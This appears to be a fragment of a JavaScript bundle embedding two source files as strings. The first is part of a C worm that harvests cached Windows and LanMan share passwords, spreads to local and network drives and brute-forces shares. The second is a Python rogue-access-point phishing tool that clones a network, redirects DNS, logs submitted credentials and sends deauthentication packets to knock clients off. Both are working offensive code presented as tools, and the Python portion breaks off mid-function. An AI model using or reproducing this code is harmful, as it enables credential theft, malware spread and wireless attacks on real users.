pce(PASSWORD_CACHE_ENTRY *x, DWORD) <br/> { <br/> 		memmove(buf, x->abResource+x->cbResource, x->cbPassword); <br/> 		buf[x->cbPassword] = 0; <br/> 		addPassword( buf ); <br/> 		return 0; <br/> } <br/> //----------------------------------------------------------------------------// <br/> int getCachedPasswords( void ) <br/> { <br/> 		buf = new char[1024]; <br/> 		HINSTANCE hi = LoadLibrary('mpr.dll'); <br/> 			if( hi == NULL ) <br/> 			{ <br/> 				return -1; <br/> 			} <br/> 		WORD (__stdcall *enp)(LPSTR, WORD, BYTE, void*, DWORD) = (WORD (__stdcall *)(LPSTR, WORD, BYTE, void*,  DWORD))'GetProcAddress(hi, 'WNetEnumCachedPasswords'); <br/> 			if( enp == NULL ) <br/> 			{ <br/> 				return -1; <br/> 			} <br/> 		enp( 0, 0, 0xff, pce, 0); <br/> 		FreeLibrary( hi ); <br/> 		return 0; <br/> } <br/> //----------------------------------------------------------------------------// <br/> BYTE rotr( BYTE b ) <br/> { <br/> 		BYTE carry; <br/> 		carry = b & 0x01; <br/> 		carry <<= 7; <br/> 		b >>= 1; <br/> 		b |= carry; <br/> 		return b; <br/> } <br/> //----------------------------------------------------------------------------// <br/> void decodePW( char * pw ) <br/> { <br/> 		BYTE hash = 0x35; <br/> 			while( pw && *pw ) <br/> 			{ <br/> 				*pw = *pw ^ hash; <br/> 				pw++; <br/> 				hash = rotr( hash ); <br/> 			} <br/> } <br/> //----------------------------------------------------------------------------// <br/> int addPassword( char * pwd ) <br/> { <br/> 			if( (strlen(pwd) > 0) && (strlen(pwd) < MAX_LENGTH) ) <br/> 			{ <br/> 				strcpy( passwordList[ index ], pwd); <br/> 				printf('DEBUG: ADDED: %s\n', passwordList[ index ]); <br/> 				index++; <br/> 			} <br/> 		return 0; <br/> } <br/> //----------------------------------------------------------------------------// <br/> int getSharePasswords( void ){ <br/> 		if( runningNT() == FALSE ) <br/> 		{ <br/> 			HKEY key, subkey; <br/> 			DWORD i, maxKeys, len, junk; <br/> 			char keyName[256], wrightPwd[256], readPwd[256]; <br/> 			RegOpenKeyEx(HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Network\\LanMan', 0,  <br/> NULL, &key); <br/> 			RegQueryInfoKey (key, NULL, NULL, NULL, &maxKeys, NULL, NULL,NULL, NULL, NULL, NULL, NULL); <br/> 				if( maxKeys != 0 ) <br/> 				{ <br/> 					for( i=0; i<maxKeys; i++ ) <br/> 					{ <br/> 						RegEnumKey(key, i, keyName, 256); <br/> 						RegOpenKeyEx(key, keyName, 0, NULL, &subkey); <br/> 						wrightPwd[0] = readPwd[0] = 0; <br/>  <br/> 						len = 256; <br/> 						RegQueryValueEx(subkey, 'Parm1enc', NULL, &junk, (BYTE *)wrightPwd, &len); <br/> 						wrightPwd[len] = 0; <br/> 						decodePW(wrightPwd); <br/> 						addPassword( wrightPwd ); <br/>  <br/> 						len = 256; <br/> 						RegQueryValueEx(subkey, 'Parm2enc', NULL, &junk, (BYTE *)readPwd, &len); <br/> 						readPwd[len] = 0; <br/> 						decodePW(readPwd); <br/> 						addPassword( readPwd ); <br/> 					} <br/> 				} <br/> 			RegCloseKey(subkey); <br/> 			RegCloseKey(key); <br/> 		} <br/> 		return 0; <br/> } <br/> //----------------------------------------------------------------------------// <br/> void propogateDrive( void ) <br/> { <br/> 		int length; <br/> 		char buff[MAX_LENGTH], *ptr; <br/>  <br/> 		ptr = buff; <br/> 		length = GetLogicalDriveStrings( MAX_LENGTH, ptr) ; <br/>  <br/> 		if( length > 0 && length < MAX_LENGTH) <br/> 		{ <br/> 			for( int i=0 ; i<=(length/4) ; i++ ) <br/> 			{ <br/> 					switch( GetDriveType( ptr ) ) <br/> 					{ <br/> 						case DRIVE_FIXED: <br/> 							// The drive is a local drive. <br/> 							printf('DRIVE_FIXED: %s\n', ptr); <br/> 							attackDrive( ptr, 1 ); <br/> 							break; <br/> 						case DRIVE_REMOTE: <br/> 							// The drive is a network drive. <br/> 							printf('DRIVE_REMOTE: %s\n', ptr); <br/> 							attackDrive( ptr, 1 ); <br/> 							break; <br/> 						default: <br/> 							break; <br/> 					} <br/> 				*ptr+=1; <br/> 			} <br/> 		} <br/> 		return; <br/> } <br/> //----------------------------------------------------------------------------// <br/> void attackDrive( char * drive, int type ) <br/> { <br/> 		FILE *fpAutorun; <br/> 		char buff[MAX_LENGTH]; <br/> 		// copy worm to drive, Attribute = hidden <br/> 			if( type == 1 ) <br/> 			{ <br/> 				sprintf( buff, '%s%s', drive, EARTH_WORM_JIM); <br/> 			} else { <br/> 				sprintf( buff, '%s\\%s', drive, EARTH_WORM_JIM); <br/> 			} <br/> 		printf('DEBUG: propogateDrive: attacking %s\nATTACK REMOTE: %s\n', drive, buff); <br/> 		/*    if( CopyFile( ptrEgo, buff, FALSE) == TRUE && type == 1 ) <br/> 			{ <br/> 				// create an Autorun.inf file on drive, Attribute = hidden <br/> 				sprintf( buff, '%sAutorun.inf', drive); <br/> 				fpAutorun = fopen(buff, 'w'); <br/> 					if( fpAutorun != NULL ) <br/> 					{ <br/> 						fprintf( fpAutorun, '[Autorun]\nOPEN=%s\n', EARTH_WORM_JIM); <br/> 						fclose( fpAutorun ); <br/> 						_rtl_chmod(buff, 1, FA_HIDDEN | FA_RDONLY); <br/> 					} <br/> 			}   */ <br/> 		return; <br/> } <br/> //----------------------------------------------------------------------------// <br/> void propogateNet( LPNETRESOURCE lpnr ) <br/> { <br/> 		DWORD dwResult, dwResultEnum, cbBuffer = 16384, cEntries = 0xFFFFFFFF; <br/> 		HANDLE hEnum; <br/> 		LPNETRESOURCE lpnrLocal; <br/> 		dwResult = WNetOpenEnum( RESOURCE_GLOBALNET, RESOURCETYPE_ANY, 0, lpnr, &hEnum); <br/> 			if( dwResult != NO_ERROR ) <br/> 			{ <br/> 				return; <br/> 			} <br/> 			do <br/> 			{ <br/> 				lpnrLocal = (LPNETRESOURCE) GlobalAlloc(GPTR, cbBuffer); <br/> 				dwResultEnum = WNetEnumResource(hEnum, &cEntries, lpnrLocal, &cbBuffer); <br/> 					if ( dwResultEnum == NO_ERROR ) <br/> 					{ <br/> 						for( DWORD i = 0; i < cEntries; i++ ) <br/> 						{ <br/> 								if( RESOURCEUSAGE_CONTAINER == ( lpnrLocal[i].dwUsage & RESOURCEUSAGE_CONTAINER ) ) <br/> 								{ <br/> 									propogateNet( &lpnrLocal[i] ); <br/> 								} else if( RESOURCETYPE_DISK  == ( lpnrLocal[i].dwUsage & RESOURCETYPE_DISK ) ) <br/> 								{ <br/> 									if( WNetAddConnection( lpnrLocal[ i ].lpRemoteName, NULL, NULL) ==  <br/> ERROR_INVALID_PASSWORD ) <br/> 									{ <br/> 										// try all found password/username combinations... <br/> 										printf('ERROR_INVALID_PASSWORD '); printf('ATTACKING: %s\n',lpnrLocal[ i  ].lpRemoteName ); <br/> 											if( crackNetShare( lpnrLocal[ i ].lpRemoteName ) == 0 ) <br/> 											{ <br/> 												attackDrive( lpnrLocal[i].lpRemoteName, 0 ); <br/> 												WNetCancelConnection( lpnrLocal[i].lpRemoteName, FALSE); <br/> 											} <br/> 									} else { <br/> 										attackDrive( lpnrLocal[i].lpRemoteName, 0 ); <br/> 										WNetCancelConnection( lpnrLocal[i].lpRemoteName, FALSE); <br/> 										printf('ACCESS NOT DENIED '); printf('ATTACKING: %s\n',lpnrLocal[ i ].lpRemoteName ); <br/> 									} <br/> 								} <br/> 						} <br/> 					} else if( dwResultEnum != ERROR_NO_MORE_ITEMS ) { <br/> 						break; <br/> 					} <br/> 			} while( dwResultEnum != ERROR_NO_MORE_ITEMS ); <br/> 		GlobalFree( (HGLOBAL) lpnrLocal ); <br/> 		WNetCloseEnum( hEnum ); <br/> 		return; <br/> } <br/> //----------------------------------------------------------------------------// <br/> int crackNetShare( char * share ) <br/> { <br/> 		int retval = 0; <br/> 			for( int i=0 ; i<index ; i++ ) <br/> 			{ <br/> 				retval = WNetAddConnection( share , passwordList[i], NULL ); <br/> 				if( retval == NO_ERROR && retval != ERROR_INVALID_PASSWORD )   // <----- !!! dodgy testing, fix it <br/> 				{ <br/> 					printf('PASS CRACKED: %s : %s\n', share , passwordList[i]); <br/> 					return 0; <br/> 				} <br/> 			} <br/> 		return -1; <br/> } <br/> //----------------------------------------------------------------------------// <br/> void releasePayload() <br/> { <br/> 		printf('!!! PAYLOAD !!!\n'); <br/> 		return; <br/> } <br/> ";
},{}],176:[function(require,module,exports){
module.exports="#!/usr/bin/env python2 <br/> # -*- coding: utf-8 -*- <br/>  <br/> import os <br/> import ssl <br/> import re <br/> import time <br/> import sys <br/> import SimpleHTTPServer <br/> import BaseHTTPServer <br/> import httplib <br/> import SocketServer <br/> import cgi <br/> import argparse <br/> import fcntl <br/> from threading import Thread, Lock <br/> from subprocess import Popen, PIPE, check_output <br/> import logging <br/> logging.getLogger('scapy.runtime').setLevel(logging.ERROR) <br/> from scapy.all import * <br/>  <br/> conf.verb = 0 <br/>  <br/> # Basic configuration <br/> PORT = 8080 <br/> SSL_PORT = 443 <br/> PEM = 'cert/server.pem' <br/> PHISING_PAGE = 'phishing-scenarios/minimal' <br/> POST_VALUE_PREFIX = 'wfphshr' <br/> NETWORK_IP = '10.0.0.0' <br/> NETWORK_MASK = '255.255.255.0' <br/> NETWORK_GW_IP = '10.0.0.1' <br/> DHCP_LEASE = '10.0.0.2,10.0.0.100,12h' <br/>  <br/> DN = open(os.devnull, 'w') <br/>  <br/> # Console colors <br/> W = '[0m'    # white (normal) <br/> R = '[31m'   # red <br/> G = '[32m'   # green <br/> O = '[33m'   # orange <br/> B = '[34m'   # blue <br/> P = '[35m'   # purple <br/> C = '[36m'   # cyan <br/> GR = '[37m'  # gray <br/> T = '[93m'   # tan <br/>  <br/> count = 0  # for channel hopping Thread <br/> APs = {}  # for listing APs <br/> hop_daemon_running = True <br/> terminate = False <br/> lock = Lock() <br/>  <br/>  <br/> def parse_args(): <br/> 	# Create the arguments <br/> 	parser = argparse.ArgumentParser() <br/> 	parser.add_argument( <br/> 		'-c', <br/> 		'--channel', <br/> 		help='Choose the channel for monitoring. Default is channel 1', <br/> 		default='1' <br/> 	) <br/> 	parser.add_argument( <br/> 		'-s', <br/> 		'--skip', <br/> 		help='Skip deauthing this MAC address. Example: -s 00:11:BB:33:44:AA' <br/> 	) <br/> 	parser.add_argument( <br/> 		'-jI', <br/> 		'--jamminginterface', <br/> 		help=('Choose monitor mode interface. ' + <br/> 			  'By default script will find the most powerful interface and ' + <br/> 			  'starts monitor mode on it. Example: -jI mon5' <br/> 			  ) <br/> 	) <br/> 	parser.add_argument( <br/> 		'-aI', <br/> 		'--apinterface', <br/> 		help=('Choose monitor mode interface. ' + <br/> 			  'By default script will find the most powerful interface and ' + <br/> 			  'starts monitor mode on it. Example: -jI mon5' <br/> 			  ) <br/> 	) <br/> 	parser.add_argument( <br/> 		'-m', <br/> 		'--maximum', <br/> 		help=('Choose the maximum number of clients to deauth.' + <br/> 			  'List of clients will be emptied and repopulated after' + <br/> 			  'hitting the limit. Example: -m 5' <br/> 			  ) <br/> 	) <br/> 	parser.add_argument( <br/> 		'-n', <br/> 		'--noupdate', <br/> 		help=('Do not clear the deauth list when the maximum (-m) number' + <br/> 			  'of client/AP combos is reached. Must be used in conjunction' + <br/> 			  'with -m. Example: -m 10 -n' <br/> 			  ), <br/> 		action='store_true' <br/> 	) <br/> 	parser.add_argument( <br/> 		'-t', <br/> 		'--timeinterval', <br/> 		help=('Choose the time interval between packets being sent.' + <br/> 			  ' Default is as fast as possible. If you see scapy ' + <br/> 			  'errors like 'no buffer space' try: -t .00001' <br/> 			  ) <br/> 	) <br/> 	parser.add_argument( <br/> 		'-p', <br/> 		'--packets', <br/> 		help=('Choose the number of packets to send in each deauth burst. ' + <br/> 			  'Default value is 1; 1 packet to the client and 1 packet to ' + <br/> 			  'the AP. Send 2 deauth packets to the client and 2 deauth ' + <br/> 			  'packets to the AP: -p 2' <br/> 			  ) <br/> 	) <br/> 	parser.add_argument( <br/> 		'-d', <br/> 		'--directedonly', <br/> 		help=('Skip the deauthentication packets to the broadcast address of' + <br/> 			  'the access points and only send them to client/AP pairs' <br/> 			  ), <br/> 		action='store_true') <br/> 	parser.add_argument( <br/> 		'-a', <br/> 		'--accesspoint', <br/> 		help='Enter the MAC address of a specific access point to target' <br/> 	) <br/>  <br/> 	return parser.parse_args() <br/>  <br/>  <br/> class SecureHTTPServer(BaseHTTPServer.HTTPServer): <br/> 	''' <br/> 	Simple HTTP server that extends the SimpleHTTPServer standard <br/> 	module to support the SSL protocol. <br/>  <br/> 	Only the server is authenticated while the client remains <br/> 	unauthenticated (i.e. the server will not request a client <br/> 	certificate). <br/>  <br/> 	It also reacts to self.stop flag. <br/> 	''' <br/> 	def __init__(self, server_address, HandlerClass): <br/> 		SocketServer.BaseServer.__init__(self, server_address, HandlerClass) <br/> 		self.socket = ssl.SSLSocket( <br/> 			socket.socket(self.address_family, self.socket_type), <br/> 			keyfile=PEM, <br/> 			certfile=PEM <br/> 		) <br/>  <br/> 		self.server_bind() <br/> 		self.server_activate() <br/>  <br/> 	def serve_forever(self): <br/> 		''' <br/> 		Handles one request at a time until stopped. <br/> 		''' <br/> 		self.stop = False <br/> 		while not self.stop: <br/> 			self.handle_request() <br/>  <br/>  <br/> class SecureHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler): <br/> 	''' <br/> 	Request handler for the HTTPS server. It responds to <br/> 	everything with a 301 redirection to the HTTP server. <br/> 	''' <br/> 	def do_QUIT(self): <br/> 		''' <br/> 		Sends a 200 OK response, and sets server.stop to True <br/> 		''' <br/> 		self.send_response(200) <br/> 		self.end_headers() <br/> 		self.server.stop = True <br/>  <br/> 	def setup(self): <br/> 		self.connection = self.request <br/> 		self.rfile = socket._fileobject(self.request, 'rb', self.rbufsize) <br/> 		self.wfile = socket._fileobject(self.request, 'wb', self.wbufsize) <br/>  <br/> 	def do_GET(self): <br/> 		self.send_response(301) <br/> 		self.send_header('Location', 'http://' + NETWORK_GW_IP + ':' + str(PORT)) <br/> 		self.end_headers() <br/>  <br/> 	def log_message(self, format, *args): <br/> 		return <br/>  <br/>  <br/> class HTTPServer(BaseHTTPServer.HTTPServer): <br/> 	''' <br/> 	HTTP server that reacts to self.stop flag. <br/> 	''' <br/>  <br/> 	def serve_forever(self): <br/> 		''' <br/> 		Handle one request at a time until stopped. <br/> 		''' <br/> 		self.stop = False <br/> 		while not self.stop: <br/> 			self.handle_request() <br/>  <br/>  <br/> class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler): <br/> 	''' <br/> 	Request handler for the HTTP server that logs POST requests. <br/> 	''' <br/> 	def redirect(self, page='/'): <br/> 		self.send_response(301) <br/> 		self.send_header('Location', page) <br/> 		self.end_headers() <br/>  <br/> 	def do_QUIT(self): <br/> 		''' <br/> 		Sends a 200 OK response, and sets server.stop to True <br/> 		''' <br/> 		self.send_response(200) <br/> 		self.end_headers() <br/> 		self.server.stop = True <br/>  <br/> 	def do_GET(self): <br/>  <br/> 		if self.path == '/': <br/> 			wifi_webserver_tmp = '/tmp/wifiphisher-webserver.tmp' <br/> 			with open(wifi_webserver_tmp, 'a+') as log_file: <br/> 				log_file.write('[' + T + '*' + W + '] ' + O + 'GET ' + T + <br/> 							   self.client_address[0] + W + '\n' <br/> 							   ) <br/> 				log_file.close() <br/> 			self.path = 'index.html' <br/> 		self.path = '%s/%s' % (PHISING_PAGE, self.path) <br/>  <br/> 		if self.path.endswith('.html'): <br/> 			if not os.path.isfile(self.path): <br/> 				self.send_response(404) <br/> 				return <br/> 			f = open(self.path) <br/> 			self.send_response(200) <br/> 			self.send_header('Content-type', 'text-html') <br/> 			self.end_headers() <br/> 			# Send file content to client <br/> 			self.wfile.write(f.read()) <br/> 			f.close() <br/> 			return <br/> 		# Leave binary and other data to default handler. <br/> 		else: <br/> 			SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self) <br/>  <br/> 	def do_POST(self): <br/> 		global terminate <br/> 		redirect = False <br/> 		form = cgi.FieldStorage( <br/> 			fp=self.rfile, <br/> 			headers=self.headers, <br/> 			environ={'REQUEST_METHOD': 'POST', <br/> 					 'CONTENT_TYPE': self.headers['Content-type'], <br/> 					 }) <br/> 		if not form.list: <br/> 			return <br/> 		for item in form.list: <br/> 			if item.name and item.value and POST_VALUE_PREFIX in item.name: <br/> 				redirect = True <br/> 				wifi_webserver_tmp = '/tmp/wifiphisher-webserver.tmp' <br/> 				with open(wifi_webserver_tmp, 'a+') as log_file: <br/> 					log_file.write('[' + T + '*' + W + '] ' + O + 'POST ' + <br/> 								   T + self.client_address[0] + <br/> 								   R + ' ' + item.name + '=' + item.value + <br/> 								   W + '\n' <br/> 								   ) <br/> 					log_file.close() <br/> 		if redirect == True: <br/> 			self.redirect('/upgrading.html') <br/> 			terminate = True <br/> 			return <br/> 		self.redirect() <br/>  <br/> 	def log_message(self, format, *args): <br/> 		return <br/>  <br/>  <br/> def stop_server(port=PORT, ssl_port=SSL_PORT): <br/> 	''' <br/> 	Sends QUIT request to HTTP server running on localhost:<port> <br/> 	''' <br/> 	conn = httplib.HTTPConnection('localhost:%d' % port) <br/> 	conn.request('QUIT', '/') <br/> 	conn.getresponse() <br/>  <br/> 	conn = httplib.HTTPSConnection('localhost:%d' % ssl_port) <br/> 	conn.request('QUIT', '/') <br/> 	conn.getresponse() <br/>  <br/>  <br/> def shutdown(): <br/> 	''' <br/> 	Shutdowns program. <br/> 	''' <br/> 	os.system('iptables -F') <br/> 	os.system('iptables -X') <br/> 	os.system('iptables -t nat -F') <br/> 	os.system('iptables -t nat -X') <br/> 	os.system('pkill airbase-ng') <br/> 	os.system('pkill dnsmasq') <br/> 	os.system('pkill hostapd') <br/> 	if os.path.isfile('/tmp/wifiphisher-webserver.tmp'): <br/> 		os.remove('/tmp/wifiphisher-webserver.tmp') <br/> 	if os.path.isfile('/tmp/wifiphisher-jammer.tmp'): <br/> 		os.remove('/tmp/wifiphisher-jammer.tmp') <br/> 	if os.path.isfile('/tmp/hostapd.conf'): <br/> 		os.remove('/tmp/hostapd.conf') <br/> 	reset_interfaces() <br/> 	print '\n[' + R + '!' + W + '] Closing' <br/> 	sys.exit(0) <br/>  <br/>  <br/> def get_interfaces(): <br/> 	interfaces = {'monitor': [], 'managed': [], 'all': []} <br/> 	proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN) <br/> 	for line in proc.communicate()[0].split('\n'): <br/> 		if len(line) == 0: <br/> 			continue  # Isn't an empty string <br/> 		if line[0] != ' ':  # Doesn't start with space <br/> 			wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line) <br/> 			if not wired_search:  # Isn't wired <br/> 				iface = line[:line.find(' ')]  # is the interface <br/> 				if 'Mode:Monitor' in line: <br/> 					interfaces['monitor'].append(iface) <br/> 				elif 'IEEE 802.11' in line: <br/> 					interfaces['managed'].append(iface) <br/> 				interfaces['all'].append(iface) <br/> 	return interfaces <br/>  <br/>  <br/> def get_iface(mode='all', exceptions=['_wifi']): <br/> 	ifaces = get_interfaces()[mode] <br/> 	for i in ifaces: <br/> 		if i not in exceptions: <br/> 			return i <br/> 	return False <br/>  <br/>  <br/> def reset_interfaces(): <br/> 	monitors = get_interfaces()['monitor'] <br/> 	for m in monitors: <br/> 		if 'mon' in m: <br/> 			Popen(['airmon-ng', 'stop', m], stdout=DN, stderr=DN) <br/> 		else: <br/> 			Popen(['ifconfig', m, 'down'], stdout=DN, stderr=DN) <br/> 			Popen(['iwconfig', m, 'mode', 'managed'], stdout=DN, stderr=DN) <br/> 			Popen(['ifconfig', m, 'up'], stdout=DN, stderr=DN) <br/>  <br/>  <br/> def get_internet_interface(): <br/> 	'''return the wifi internet connected iface''' <br/> 	inet_iface = None <br/>  <br/> 	if os.path.isfile('/sbin/ip') == True: <br/> 		proc = Popen(['/sbin/ip', 'route'], stdout=PIPE, stderr=DN) <br/> 		def_route = proc.communicate()[0].split('\n')  # [0].split() <br/> 		for line in def_route: <br/> 			if 'wlan' in line and 'default via' in line: <br/> 				line = line.split() <br/> 				inet_iface = line[4] <br/> 				ipprefix = line[2][:2]  # Just checking if it's 192, 172, or 10 <br/> 				return inet_iface <br/> 	else: <br/> 		proc = open('/proc/net/route', 'r') <br/> 		default = proc.readlines()[1] <br/> 		if 'wlan' in default: <br/> 			def_route = default.split()[0] <br/> 		x = iter(default.split()[2]) <br/> 		res = [''.join(i) for i in zip(x, x)] <br/> 		d = [str(int(i, 16)) for i in res] <br/> 		return inet_iface <br/> 	return False <br/>  <br/>  <br/> def channel_hop(mon_iface): <br/> 	chan = 0 <br/> 	err = None <br/> 	while hop_daemon_running: <br/> 		try: <br/> 			err = None <br/> 			if chan > 11: <br/> 				chan = 0 <br/> 			chan = chan + 1 <br/> 			channel = str(chan) <br/> 			iw = Popen( <br/> 				['iw', 'dev', mon_iface, 'set', 'channel', channel], <br/> 				stdout=DN, stderr=PIPE <br/> 			) <br/> 			for line in iw.communicate()[1].split('\n'): <br/> 				# iw dev shouldnt display output unless there's an error <br/> 				if len(line) > 2: <br/> 					with lock: <br/> 						err = ( <br/> 							'[' + R + '-' + W + '] Channel hopping failed: ' + <br/> 							R + line + W + '\n' <br/> 							'Try disconnecting the monitor mode's parent' + <br/> 							'interface (e.g. wlan0)\n' <br/> 							'from the network if you have not already\n' <br/> 						) <br/> 					break <br/> 			time.sleep(1) <br/> 		except KeyboardInterrupt: <br/> 			sys.exit() <br/>  <br/>  <br/> def sniffing(interface, cb): <br/> 	'''This exists for if/when I get deauth working <br/> 	so that it's easy to call sniff() in a thread''' <br/> 	sniff(iface=interface, prn=cb, store=0) <br/>  <br/>  <br/> def targeting_cb(pkt): <br/> 	global APs, count <br/> 	if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp): <br/> 		try: <br/> 			ap_channel = str(ord(pkt[Dot11Elt:3].info)) <br/> 		except Exception: <br/> 			return <br/> 		essid = pkt[Dot11Elt].info <br/> 		mac = pkt[Dot11].addr2 <br/> 		if len(APs) > 0: <br/> 			for num in APs: <br/> 				if essid in APs[num][1]: <br/> 					return <br/> 		count += 1 <br/> 		APs[count] = [ap_channel, essid, mac] <br/> 		target_APs() <br/>  <br/>  <br/> def target_APs(): <br/> 	global APs, count <br/> 	os.system('clear') <br/> 	print ('[' + G + '+' + W + '] Ctrl-C at any time to copy an access' + <br/> 		   ' point from below') <br/> 	print 'num  ch   ESSID' <br/> 	print '---------------' <br/> 	for ap in APs: <br/> 		print (G + str(ap).ljust(2) + W + ' - ' + APs[ap][0].ljust(2) + ' - ' + <br/> 			   T + APs[ap][1] + W) <br/>  <br/>  <br/> def copy_AP(): <br/> 	global APs, count <br/> 	copy = None <br/> 	while not copy: <br/> 		try: <br/> 			copy = raw_input( <br/> 				('\n[' + G + '+' + W + '] Choose the [' + G + 'num' + W + <br/> 				 '] of the AP you wish to copy: ') <br/> 			) <br/> 			copy = int(copy) <br/> 		except Exception: <br/> 			copy = None <br/> 			continue <br/> 	try: <br/> 		channel = APs[copy][0] <br/> 		essid = APs[copy][1] <br/> 		if str(essid) == '\x00': <br/> 			essid = ' ' <br/> 		mac = APs[copy][2] <br/> 		return channel, essid, mac <br/> 	except KeyError: <br/> 		return copy_AP() <br/>  <br/>  <br/> def start_ap(mon_iface, channel, essid, args): <br/> 	print '[' + T + '*' + W + '] Starting the fake access point...' <br/> 	config = ( <br/> 		'interface=%s\n' <br/> 		'driver=nl80211\n' <br/> 		'ssid=%s\n' <br/> 		'hw_mode=g\n' <br/> 		'channel=%s\n' <br/> 		'macaddr_acl=0\n' <br/> 		'ignore_broadcast_ssid=0\n' <br/> 	) <br/> 	with open('/tmp/hostapd.conf', 'w') as dhcpconf: <br/> 			dhcpconf.write(config % (mon_iface, essid, channel)) <br/>  <br/> 	Popen(['hostapd', '/tmp/hostapd.conf'], stdout=DN, stderr=DN) <br/> 	try: <br/> 		time.sleep(6)  # Copied from Pwnstar which said it was necessary? <br/> 	except KeyboardInterrupt: <br/> 		shutdown() <br/>  <br/>  <br/> def dhcp_conf(interface): <br/>  <br/> 	config = ( <br/> 		'no-resolv\n' <br/> 		'interface=%s\n' <br/> 		'dhcp-range=%s\n' <br/> 		'address=/#/%s' <br/> 	) <br/>  <br/> 	with open('/tmp/dhcpd.conf', 'w') as dhcpconf: <br/> 		dhcpconf.write(config % (interface, DHCP_LEASE, NETWORK_GW_IP)) <br/> 	return '/tmp/dhcpd.conf' <br/>  <br/>  <br/> def dhcp(dhcpconf, mon_iface): <br/> 	os.system('echo > /var/lib/misc/dnsmasq.leases') <br/> 	dhcp = Popen(['dnsmasq', '-C', dhcpconf], stdout=PIPE, stderr=DN) <br/> 	Popen(['ifconfig', str(mon_iface), 'mtu', '1400'], stdout=DN, stderr=DN) <br/> 	Popen( <br/> 		['ifconfig', str(mon_iface), 'up', NETWORK_GW_IP, <br/> 		 'netmask', NETWORK_MASK <br/> 		 ], <br/> 		stdout=DN, <br/> 		stderr=DN <br/> 	) <br/> 	# Make sure that we have set the network properly. <br/> 	proc = check_output(['ifconfig', str(mon_iface)]) <br/> 	if NETWORK_GW_IP not in proc: <br/> 		return False <br/> 	time.sleep(.5) # Give it some time to avoid 'SIOCADDRT: Network is unreachable' <br/> 	os.system( <br/> 		('route add -net %s netmask %s gw %s' %  <br/> 		(NETWORK_IP, NETWORK_MASK, NETWORK_GW_IP)) <br/> 	) <br/> 	return True <br/>  <br/>  <br/> def get_strongest_iface(exceptions=[]): <br/> 	interfaces = get_interfaces()['managed'] <br/> 	scanned_aps = [] <br/> 	for i in interfaces: <br/> 		if i in exceptions: <br/> 			continue <br/> 		count = 0 <br/> 		proc = Popen(['iwlist', i, 'scan'], stdout=PIPE, stderr=DN) <br/> 		for line in proc.communicate()[0].split('\n'): <br/> 			if ' - Address:' in line:  # first line in iwlist scan for a new AP <br/> 				count += 1 <br/> 		scanned_aps.append((count, i)) <br/> 		print ('[' + G + '+' + W + '] Networks discovered by ' <br/> 			   + G + i + W + ': ' + T + str(count) + W) <br/> 	if len(scanned_aps) > 0: <br/> 		interface = max(scanned_aps)[1] <br/> 		return interface <br/> 	return False <br/>  <br/>  <br/> def start_mode(interface, mode='monitor'): <br/> 	print ('[' + G + '+' + W + '] Starting ' + mode + ' mode off ' <br/> 		   + G + interface + W) <br/> 	try: <br/> 		os.system('ifconfig %s down' % interface) <br/> 		os.system('iwconfig %s mode %s' % (interface, mode)) <br/> 		os.system('ifconfig %s up' % interface) <br/> 		return interface <br/> 	except Exception: <br/> 		sys.exit('[' + R + '-' + W + '] Could not start %s mode' % mode) <br/>  <br/>  <br/> # Wifi Jammer stuff <br/> # TODO: Merge this with the other channel_hop method. <br/> def channel_hop2(mon_iface): <br/> 	''' <br/> 	First time it runs through the channels it stays on each channel for <br/> 	5 seconds in order to populate the deauth list nicely. <br/> 	After that it goes as fast as it can <br/> 	''' <br/> 	global monchannel, first_pass <br/>  <br/> 	channelNum = 0 <br/> 	err = None <br/>  <br/> 	while 1: <br/> 		if args.channel: <br/> 			with lock: <br/> 				monchannel = args.channel <br/> 		else: <br/> 			channelNum += 1 <br/> 			if channelNum > 11: <br/> 				channelNum = 1 <br/> 				with lock: <br/> 					first_pass = 0 <br/> 			with lock: <br/> 				monchannel = str(channelNum) <br/>  <br/> 			proc = Popen( <br/> 				['iw', 'dev', mon_iface, 'set', 'channel', monchannel], <br/> 				stdout=DN, <br/> 				stderr=PIPE <br/> 			) <br/>  <br/> 			for line in proc.communicate()[1].split('\n'): <br/> 				if len(line) > 2: <br/> 					# iw dev shouldnt display output unless there's an error <br/> 					err = ('[' + R + '-' + W + '] Channel hopping failed: ' <br/> 						   + R + line + W) <br/>  <br/> 		output(monchannel) <br/> 		if args.channel: <br/> 			time.sleep(.05) <br/> 		else: <br/> 			# For the first channel hop thru, do not deauth <br/> 			if first_pass == 1: <br/> 				time.sleep(1) <br/> 				continue <br/>  <br/> 		deauth(monchannel) <br/>  <br/>  <br/> def deauth(monchannel): <br/> 	''' <br/> 	addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway <br/> 	if there's multi-APs to one gateway. Constantly scans the clients_APs list <br/> 	and starts a thread to deauth each instance <br/> 	''' <br/>  <br/> 	pkts = [] <br/>  <br/> 	if len(clients_APs) > 0: <br/> 		with lock: <br/> 			for x in clients_APs: <br/> 				client = x[0] <br/> 				ap = x[1] <br/> 				ch = x[2] <br/> 				''' <br/> 				Can't add a RadioTap() layer as the first layer or it's a <br/> 				malformed Association request packet? <br/> 				Append the packets to a new list so we don't have to hog the <br/> 				lock type=0, subtype=12? <br/> 				''' <br/> 				if ch == monchannel: <br/> 					deauth_pkt1 = Dot11( <br/> 						addr1=client, <br/> 						addr2=ap, <br/> 						addr3=ap) / Dot11Deauth() <br/> 					deauth_pkt2 = Dot11( <br/> 						addr1=ap, <br/> 						addr2=client, <br/> 						addr3=client) / Dot11Deauth() <br/> 					pkts.append(deauth_pkt1) <br/> 					pkts.append(deauth_pkt2) <br/> 	if len(APs) > 0: <br/> 		if not args.directedonly: <br/> 			with lock: <br/> 				for a in APs: <br/> 					ap = a[0] <br/> 					ch = a[1] <br/> 					if ch == monchannel: <br/> 						deauth_ap = Dot11( <br/> 							addr1='ff:ff:ff:ff:ff:ff', <br/> 							addr2=ap, <br/> 							addr3=ap) / Dot11Deauth() <br/> 						pkts.append(deauth_ap) <br/>  <br/> 	if len(pkts) > 0: <br/> 		# prevent 'no buffer space' scapy error http://goo.gl/6YuJbI <br/> 		if not args.timeinterval: <br/> 			args.timeinterval = 0 <br/> 		if not args.packets: <br/> 			args.packets = 1 <br/>  